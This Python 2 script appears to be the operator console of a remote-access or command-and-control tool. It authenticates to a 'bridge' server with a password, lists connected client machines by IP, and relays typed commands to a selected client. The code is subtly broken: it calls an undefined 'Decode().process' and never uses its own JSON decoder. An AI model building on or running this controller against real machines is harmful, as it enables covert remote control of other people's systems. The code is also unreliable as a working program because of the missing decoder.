#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
from ConfigParser import SafeConfigParser
import json
import os
import subprocess
import sys
import threading
import time
from socket import *

config = {}
execfile("Control.conf", config) 	
	
class control():

	def formatData(self, data):
		ipAddresses = []
		length = len(data)
		i=0
		if length >= 1:
			print " _____________________"
			print "| # |       IP        |"
			print "|---------------------|"
			for client in data:
				IP = (client[u'ip'])
				print "| {lenn} | {ip} ".format(lenn=str(i), ip=IP)
				i=i+1
			
			print " --------------------- "
			return " "
		else:
			return " [-] No Clients Connected"
			
	def jsonDecode(self, string):
		try:
			parsed_json = json.loads(string)
			status = (parsed_json["status"])
			if status == "OK":
				command = (parsed_json["command"])
				if (command == "list"):
					client = (parsed_json["clients"])
					reply = control.formatData(self, client)
				else: 
					reply = (parsed_json["reply"])
			else:
				reply = (parsed_json["error"])
			return str(reply)
		except Exception as e:
			print " [!] {error}".format(error=str(e))

	def main(self):
		try:
			s=socket(AF_INET, SOCK_STREAM)
			s.connect((args.host,args.port))
		except Exception as e:
			sys.exit(e)

		login = {'password': args.password}
		login = json.dumps(login)
		s.send(login)

		while True:
			command = raw_input("$")
			try:
				if(command == "clear"):
					if sys.platform == 'win32':
						os.system("cls")
					else:
						os.system("clear")
				elif(command == "help"):
					print config["allcommands"]
				elif("interact" in command):
					answers = command.split(' ')
					if len(answers) == 1:
						client = raw_input(" [#] Client Number:")
						Cmd = {"command": command, "client":client}
					else:
						Cmd = {"command": answers[0], "client":answers[1]} 
					Cmd = json.dumps(Cmd)
					s.send(Cmd)
					reply = s.recv(20480)
					Reply = Decode().process(reply)
					print str(Reply)

				else:
					Cmd = {'command': command}
					Cmd = json.dumps(Cmd)
					s.send(Cmd)
					reply = s.recv(20480)
					Reply = Decode().process(reply)
					print str(Reply)

			except KeyboardInterrupt:
				try:
					s.send("quit")
					s.close()
					print " [!] Connection Closed"
					break
				except:
					pass
			except Exception as e:
				print e
				print " [!] Connection Closed"
				s.close()
				break

if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-H", "--host", help="Host IP Address", required = True)
	parser.add_argument("-p", "--port", type=int, help="Connection Port Number", required = True)
	parser.add_argument("-P", "--password", type=str, help="Bridge Connection Password", required = True)
	parser.add_argument('-v', '--version',
						action='version',
						version=' [+] Version: 1.0')
	args = parser.parse_args()
	if sys.platform == 'win32': os.system("cls")
	else: os.system("clear")
	print config["intro"]
	control().main()
